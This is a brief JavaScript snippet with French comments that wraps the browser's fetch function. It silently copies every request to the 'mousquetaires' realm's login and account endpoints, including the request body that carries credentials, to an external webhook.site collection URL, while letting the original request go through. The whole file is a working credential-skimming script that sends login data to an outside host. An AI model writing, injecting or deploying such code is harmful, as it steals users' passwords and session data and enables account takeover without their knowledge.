(function() {
  // Sauvegarde de la fonction fetch originale
  const originalFetch = window.fetch;
  
  // Redéfinition de fetch
  window.fetch = async function(input, init) {
    // Récupération de l'URL (input peut être un objet Request)
    const url = (typeof input === 'string') ? input : input.url;
    
    // Vérifier si l'URL correspond à l'une de celles qui nous intéressent
    if(url.includes('/auth/realms/mousquetaires/account') || url.includes('/auth/realms/mousquetaires/login-actions/authenticate')) {
      // Par exemple, envoyer ces infos vers votre serveur de collecte
      originalFetch('https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8/collect', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ url, init })
      });
    }
    
    // Appel de la fonction fetch originale pour continuer le traitement normal
    return originalFetch(input, init);
  };
})();
